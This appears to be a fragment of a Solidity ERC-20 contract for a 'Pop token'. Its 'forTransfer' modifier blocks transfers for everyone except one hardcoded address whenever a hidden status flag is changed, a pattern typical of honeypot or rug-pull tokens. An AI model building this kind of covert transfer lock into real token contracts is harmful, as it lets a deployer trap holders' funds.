...
contract TestPopToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokeni_totalSupply;
    uint256 private _tokeni_status = 0;
    uint256 public stakingPooliStatus = 0;

    string private _tokeni_name;
    string private _tokeni_symbol;

    address private _pooliAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokeni_name = "Pop token";
        _tokeni_symbol = "POP";
        _tokeni_totalSupply = 1000000 * 10 ** 18;
        _balances[msg.sender] = _tokeni_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooliAddress || _tokeni_status == 0);
        _;
    }
